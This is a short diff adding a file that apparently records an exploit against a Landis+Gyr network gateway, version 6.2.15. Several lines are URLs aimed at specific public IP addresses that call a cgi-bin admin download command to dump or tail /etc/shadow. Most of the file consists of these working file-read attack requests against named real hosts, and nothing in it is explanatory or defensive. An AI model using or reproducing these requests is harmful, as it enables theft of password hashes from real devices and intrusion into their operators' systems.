@@ -1,0 +1,5 @@
+http://170.52.146.12/cgi-bin/admin/download?cmd=dumpfile&val=/etc/shadow
+http://96.1.69.179/cgi-bin/admin/download?cmd=dumpfile&val=/etc/shadow
+6.2.15
+https://www.landisgyr.com/product/network-gateway/
+view-source:http://170.52.146.12/cgi-bin/admin/download?cmd=tailfile&val=/etc/shadow
